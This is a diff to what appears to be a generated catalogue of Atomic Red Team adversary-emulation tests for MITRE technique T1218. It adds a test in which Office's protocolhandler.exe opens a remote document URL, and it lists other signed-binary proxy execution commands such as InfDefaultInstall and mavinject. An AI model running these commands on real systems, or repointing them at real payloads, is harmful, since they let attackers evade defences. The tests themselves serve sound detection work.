@@ -37,6 +37,10 @@ C:\Windows\SysWow64\Register-CimProvider.exe -Path PathToAtomicsFolder\T1218\src
 
 InfDefaultInstall.exe PathToAtomicsFolder\T1218\src\Infdefaultinstall.inf
 
+C:\Program Files\Microsoft Office\Office16\protocolhandler.exe "ms-word:nft|u|#{remote_url}"
+
+#{microsoft_wordpath}\protocolhandler.exe "ms-word:nft|u|https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218/src/T1218Test.docx"
+
 mavinject.exe|SyncAppvPublishingServer.exe
 ```
 
@@ -59,6 +63,15 @@ mavinject.exe|SyncAppvPublishingServer.exe
   'source': 'atomics/T1218/T1218.yaml'},
  {'command': 'InfDefaultInstall.exe '
              'PathToAtomicsFolder\\T1218\\src\\Infdefaultinstall.inf\n',
+  'name': None,
+  'source': 'atomics/T1218/T1218.yaml'},
+ {'command': 'C:\\Program Files\\Microsoft '
+             'Office\\Office16\\protocolhandler.exe '
+             '"ms-word:nft|u|#{remote_url}"\n',
+  'name': None,
+  'source': 'atomics/T1218/T1218.yaml'},
+ {'command': '#{microsoft_wordpath}\\protocolhandler.exe '
+             '"ms-word:nft|u|https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218/src/T1218Test.docx"\n',
   'name': None,
   'source': 'atomics/T1218/T1218.yaml'},
  {'command': 'mavinject.exe|SyncAppvPublishingServer.exe',
@@ -508,6 +521,83 @@ mavinject.exe|SyncAppvPublishingServer.exe
                                                                              'name': 'InfDefaultInstall.exe '
                                                                                      '.inf '
                                                                                      'Execution',
+                                                                             'supported_platforms': ['windows']},
+                                                                            {'auto_generated_guid': 'db020456-125b-4c8b-a4a7-487df8afb5a2',
+                                                                             'dependencies': [{'description': 'Microsoft '
+                                                                                                              'Word '
+                                                                                                              'must '
+                                                                                                              'be '
+                                                                                                              'installed '
+                                                                                                              'with '
+                                                                                                              'the '
+                                                                                                              'correct '
+                                                                                                              'path '
+                                                                                                              'and '
+                                                                                                              'protocolhandler.exe '
+                                                                                                              'must '
+                                                                                                              'be '
+                                                                                                              'provided\n',
+                                                                                               'get_prereq_command': 'write-host '
+                                                                                                                     '"Install '
+                                                                                                                     'Microsoft '
+                                                                                                                     'Word '
+                                                                                                                     'or '
+                                                                                                                     'provide '
+                                                                                                                     'correct '
+                                                                                                                     'path."\n',
+                                                                                               'prereq_command': 'if '
+                                                                                                                 '(Test-Path '
+                                                                                                                 '"#{microsoft_wordpath}\\protocolhandler.exe") '
+                                                                                                                 '{exit '
+                                                                                                                 '0} '
+                                                                                                                 'else '
+                                                                                                                 '{exit '
+                                                                                                                 '1}\n'}],
+                                                                             'dependency_executor_name': 'powershell',
+                                                                             'description': 'Emulates '
+                                                                                            'attack '
+                                                                                            'via '
+                                                                                            'documents '
+                                                                                            'through '
+                                                                                            'protocol '
+                                                                                            'handler '
+                                                                                            'in '
+                                                                                            'Microsoft '
+                                                                                            'Office.  '
+                                                                                            'On '
+                                                                                            'successful '
+                                                                                            'execution '
+                                                                                            'you '
+                                                                                            'should '
+                                                                                            'see '
+                                                                                            'Microsoft '
+                                                                                            'Word '
+                                                                                            'launch '
+                                                                                            'a '
+                                                                                            'blank '
+                                                                                            'file.\n',
+                                                                             'executor': {'command': '#{microsoft_wordpath}\\protocolhandler.exe '
+                                                                                                     '"ms-word:nft|u|#{remote_url}"\n',
+                                                                                          'elevation_required': False,
+                                                                                          'name': 'command_prompt'},
+                                                                             'input_arguments': {'microsoft_wordpath': {'default': 'C:\\Program '
+                                                                                                                                   'Files\\Microsoft '
+                                                                                                                                   'Office\\Office16',
+                                                                                                                        'description': 'path '
+                                                                                                                                       'to '
+                                                                                                                                       'office '
+                                                                                                                                       'folder',
+                                                                                                                        'type': 'path'},
+                                                                                                 'remote_url': {'default': 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218/src/T1218Test.docx',
+                                                                                                                'description': 'url '
+                                                                                                                               'to '
+                                                                                                                               'document',
+                                                                                                                'type': 'url'}},
+                                                                             'name': 'ProtocolHandler.exe '
+                                                                                     'Downloaded '
+                                                                                     'a '
+                                                                                     'Suspicious '
+                                                                                     'File',
                                                                              'supported_platforms': ['windows']}],
                                                            'attack_technique': 'T1218',
                                                            'display_name': 'Signed '
